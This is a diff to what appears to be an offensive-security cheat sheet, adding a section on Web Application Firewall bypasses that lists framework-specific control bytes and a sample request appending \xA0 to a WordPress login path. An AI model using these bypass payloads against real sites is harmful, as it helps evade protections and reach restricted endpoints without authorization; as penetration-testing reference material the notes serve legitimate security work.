@@ -66,6 +66,7 @@
 - [Upload Filter Bypass](#upload-filter-bypass)
 - [Upload Vulnerabilities](#upload-vulnerabilities)
 - [waybackurls](#waybackurls)
+- [Web Application Firewall (WAF) Bypasses](#web-application-firewall--waf--bypasses)
 - [Web Log Poisoning](#web-log-poisoning)
 - [Websocket Request Smuggling](#websocket-request-smuggling)
 - [Wfuzz](#wfuzz)
@@ -4051,6 +4052,20 @@ PDF / PPTX: Server-Side Request Forgery / Blind XXE
 
 ```c
 $ go install github.com/tomnomnom/waybackurls@latest
+```
+
+## Web Application Firewall (WAF) Bypasses
+
+### Frameworks
+
+- \x09       // Spring Framework
+- \xA0       // Express Framework
+- \x1C-1F    // Flask
+
+```c
+GET /wp-login.php\xA0 HTTP/1.1
+
+200 OK
 ```
 
 ## Web Log Poisoning
